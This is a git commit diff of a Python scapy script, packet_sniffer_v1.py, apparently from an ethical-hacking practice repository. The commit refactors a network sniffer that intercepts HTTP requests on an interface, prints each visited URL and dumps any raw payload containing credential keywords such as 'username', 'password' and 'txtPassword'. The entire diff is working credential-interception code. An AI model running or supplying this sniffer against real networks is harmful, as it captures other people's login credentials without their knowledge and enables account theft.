250041614c8fd7acdb421954c89668eb2c2b4ae4
ODYTRON <otigas@hotmail.com>
2021-01-04 16:24:06 -0500

    new files in the repo

--- packet_sniffer_v1.py
+++ packet_sniffer_v1.py
@@ -7,24 +7,40 @@ from scapy.layers import http
 def sniff(interface):
     # prn is the callback function which reads every packet of the interface we want to sniff
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
     # the callback function
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        # print(packet[scapy.YOURLAYER].YOURFIELD)
+        # print(packet[scapy.Raw].load)
+        load = (packet[scapy.Raw].load)
+        keywords = ["uname", "username", "user", "login", "login_name", "txtUsername", "password", "pass", "secret",
+                    "txtPassword"]
+        for key in keywords:
+            if key in load:
+                return load
+                #print("\n\n[+] Possible username/password > " + load + "\n\n")
+                # break to run iterate the list one time
+                #break
+
+
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         # print(packet.show)
         # this is how to concatenate two strings , see the format at the bottom notes
-        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(url)
+        url = get_url(packet)
+        print("[+] HTTP Request >> " + url)
 
-        if packet.haslayer(scapy.Raw):
-            # print(packet[scapy.YOURLAYER].YOURFIELD)
-            # print(packet[scapy.Raw].load)
-            load = (packet[scapy.Raw].load)
-            keywords = ["uname", "username", "user", "login", "login_name","txtUsername", "password", "pass", "secret", "txtPassword"]
-            for key in keywords:
-                if key in load:
-                    print(load)
-                    # break to run iterate the list one time
-                    break
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password > " + login_info + "\n\n")
+
+
+
 
 
 
